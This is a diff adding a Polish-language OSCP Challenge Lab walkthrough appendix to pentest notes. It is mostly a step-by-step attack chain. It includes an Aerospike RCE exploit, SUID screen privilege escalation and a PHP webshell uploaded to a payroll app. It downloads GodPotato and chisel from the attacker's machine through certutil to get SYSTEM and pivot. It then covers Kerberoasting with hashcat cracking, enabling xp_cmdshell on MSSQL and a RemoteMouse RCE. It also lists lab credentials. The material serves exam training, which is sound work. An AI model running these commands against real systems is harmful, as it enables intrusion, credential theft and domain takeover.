@@ -3496,3 +3496,111 @@ PtH Administratorem -> DC01 + DEV04 + PROD01 + CLIENT02 = cała domena
 - **Zawsze sprawdzaj `memberOf` zdobytych kont** — droga do DC bywa na „nieoczywistej" grupie: `Backup Operators`, `Server Operators`, `DnsAdmins`.
 - **Hash konta maszyny DC (`DC$`) = DCSync.** Nie potrzeba konta DA.
 - **NETLOGON/SYSVOL** = kanał odczytu jako nie-admin (SYSTEM zapisuje, każdy czyta) — pamiętaj **posprzątać**.
+
+---
+
+# Appendix D — OSCP Challenge Lab A (walkthrough, styl kursowy)
+
+> 6 maszyn: 3 standalone (`.143`,`.144`,`.145`) + 3 w AD `oscp.exam` (MS01 `.141`, DC01 `10.10.224.140`, MS02 `10.10.224.142`). Assumed-breach do AD: `Eric.Wallows : EricLikesRunning800`. `<KALI>` = Twój tun0.
+> Pisane prosto, jedna komenda = jeden krok, z wyjaśnieniem. Zrobione: **.143 (root)**, **MS01 (SYSTEM)**. Reszta — patrz D.6 (uczciwy stan + jak dokończyć).
+
+## D.1 Rozpoznanie sieci
+```bash
+# osiągalne wprost są .141/.143/.144/.145 (192.168.224.x); 10.10.224.x tylko przez pivot
+nmap -sV -p- --min-rate 2000 192.168.224.141
+nmap -sV -p- --min-rate 2000 192.168.224.143
+nmap -sV -p- --min-rate 2000 192.168.224.144
+nmap -sV -p- --min-rate 2000 192.168.224.145
+```
+Kluczowe: `.141` = IIS/Apache + **Attendance and Payroll System** (port 81) → wejście do AD. `.143` = porty 3000-3003 nietypowe. `.145` = port 1978 (RemoteMouse).
+
+## D.2 Standalone .143 — Aerospike → root
+```bash
+# porty 3000-3003 nie mówią HTTP -> sprawdź protokół tekstowy:
+printf 'version\r\n' | nc 192.168.224.143 3003        # -> Aerospike Community Edition build 5.1.0.1
+# 5.1.0.1 jest podatne (CVE-2020-13151). Publiczny exploit:
+searchsploit Aerospike
+searchsploit -m multiple/remote/49067.py
+python3 -m venv venv && ./venv/bin/pip install aerospike     # exploit potrzebuje klienta python
+# exploit ma błędny check wersji + krótki timeout -> popraw w 49067.py:
+#   w funkcji _is_vuln() dodaj na początku:  return True
+#   w client.apply(...) dodaj policy: {'total_timeout':60000,'socket_timeout':60000}
+# uruchom (RCE jako user aero):
+./venv/bin/python 49067.py --ahost 192.168.224.143 --aport 3000 --namespace test --cmd 'id'
+./venv/bin/python 49067.py --ahost 192.168.224.143 --aport 3000 --namespace test --cmd 'cat /home/aero/local.txt'
+```
+PrivEsc — SUID screen:
+```bash
+# przez RCE wylistuj SUID:
+#   find / -perm -4000 -type f 2>/dev/null    -> /usr/bin/screen-4.5.0  (CVE-2017-5618)
+searchsploit screen 4.5.0                                    # 41154
+# exploit wymaga kompilacji .so; brak gcc na targecie -> kompiluj na Kali i wgraj (base64)
+# uruchom łańcuch z EDB 41154 (rootbash z SUID) -> cat /root/proof.txt
+```
+
+## D.3 MS01 (.141) — Attendance and Payroll System → SYSTEM
+```bash
+# publiczny unauth RCE (upload webshella):
+searchsploit Attendance Payroll        # 50801 (RCE) / 50802 (SQLi)
+# webshell (jak w materiałach - prosty cmd shell):
+echo '<?php system($_REQUEST["cmd"]); ?>' > shell.php
+# upload przez podatny endpoint (aplikacja jest w web-root, więc bez /apsystem):
+curl -F "id=1" -F "upload=" -F "photo=@shell.php;filename=shell.php" http://192.168.224.141:81/admin/employee_edit_photo.php
+# webshell ląduje w /images/ :
+curl "http://192.168.224.141:81/images/shell.php?cmd=whoami"     # -> ms01\mary.williams
+```
+PrivEsc — SeImpersonate → SYSTEM (metoda z kursu):
+```bash
+# whoami /priv przez webshell -> SeImpersonatePrivilege -> potato
+# hostuj narzędzia na Kali:
+python3 -m http.server 8000       # w katalogu z GodPotato-NET4.exe, nc.exe
+# na MS01 (przez webshell, cmd=...):
+#   certutil -urlcache -split -f http://<KALI>:8000/GodPotato-NET4.exe C:\Windows\Temp\gp.exe
+#   C:\Windows\Temp\gp.exe -cmd "cmd /c whoami"     -> nt authority\system
+# jako SYSTEM: reg save HKLM\SAM/SYSTEM/SECURITY -> impacket-secretsdump ... LOCAL (lokalne hashe)
+# łup: admin/includes/conn.php -> MySQL root : TreeFlaskDomestic505
+```
+
+## D.4 Pivot do sieci AD (chisel)
+```bash
+# MS01 jest dual-homed (ma też 10.10.224.141). Tunel:
+chisel server -p 8080 --reverse                       # na Kali
+# na MS01 (przez webshell): pobierz chisel.exe i odpal klienta:
+#   certutil -urlcache -split -f http://<KALI>:8000/chisel.exe C:\Windows\Temp\ch.exe
+#   C:\Windows\Temp\ch.exe client <KALI>:8080 R:socks
+# -> SOCKS na 127.0.0.1:1080. Wszystko do AD: proxychains -q <narzędzie>
+# w /etc/proxychains4.conf ma być: socks5 127.0.0.1 1080
+```
+
+## D.5 Enumeracja AD (assumed breach: Eric.Wallows)
+```bash
+# identyfikacja hostów wewnętrznych:
+proxychains -q nxc smb 10.10.224.140 10.10.224.142 -u Eric.Wallows -p 'EricLikesRunning800' -d oscp.exam
+#   .140 = DC01, .142 = MS02
+
+# Kerberoasting. UWAGA: jeśli dostaniesz KRB_AP_ERR_SKEW (clock skew), zsynchronizuj zegar.
+#   Na egzaminie: sudo ntpdate <DC>  (albo sudo rdate -n <DC>)
+#   Jeśli sudo bez hasła niedostępne: użyj faketime z offsetem godzinowym:
+faketime -f '+7h' proxychains -q impacket-GetUserSPNs -dc-ip 10.10.224.140 \
+  oscp.exam/Eric.Wallows:'EricLikesRunning800' -request -outputfile kerb.txt
+hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt
+#   -> web_svc : Diamond1   (sql_svc = patrz D.6)
+
+# mapa domeny (BloodHound przez pivot):
+proxychains -q bloodhound-python -u web_svc -p Diamond1 -d oscp.exam -ns 10.10.224.140 --dns-tcp -c All --zip
+#   cel = tom_admin (Domain Admin)
+```
+
+## D.6 Stan i jak dokończyć (uczciwie)
+- **Zrobione czysto:** `.143` (root, obie flagi), **MS01** (SYSTEM + pivot).
+- **AD → DC (MS02→tom_admin→DC01):** brama to **MSSQL na MS02 przez konto `sql_svc`** (drugi kerberoast). Gdy złamiesz sql_svc:
+  ```bash
+  # MSSQL jako sql_svc (sysadmin) -> włącz i użyj xp_cmdshell:
+  proxychains -q impacket-mssqlclient oscp.exam/sql_svc:'<hasło>'@10.10.224.142 -windows-auth
+  #   SQL> EXEC sp_configure 'show advanced options',1; RECONFIGURE;
+  #   SQL> EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;
+  #   SQL> EXEC xp_cmdshell 'whoami';    -> shell na MS02 -> dump creds -> tom_admin -> DC01 proof.txt
+  ```
+  U mnie sql_svc nie złamał się (rockyou/best64/dive ani custom słownik z cewl+nazwiska). Na egzaminie to konto ZWYKLE łamie się rockyou — jeśli nie, buduj custom słownik: `cewl -d 3 -m 3 <każda strona> > words.txt`, potem `hashcat -m 13100 kerb.txt words.txt -r rules/best64.rule` oraz hybryda `-a 6 words.txt ?d?d?d`.
+- **.144:** wystawiony `.git` w web-root → `git-dumper http://192.168.224.144/.git/ out` → w historii creds do bazy „staff" (`dean:BreakingBad92`) i podatny custom-API (`export.php` = zapis pliku). Uwaga: apka nie była u mnie wdrożona pod znaną ścieżką — dokończenie wymaga znalezienia deploymentu.
+- **.145:** port 1978 = **RemoteMouse 3.008 RCE** → `msfconsole` → `use exploit/windows/misc/remote_mouse_rce` (jeden dozwolony strzał MSF na egzaminie). Wymaga aktywnej sesji pulpitu na celu.
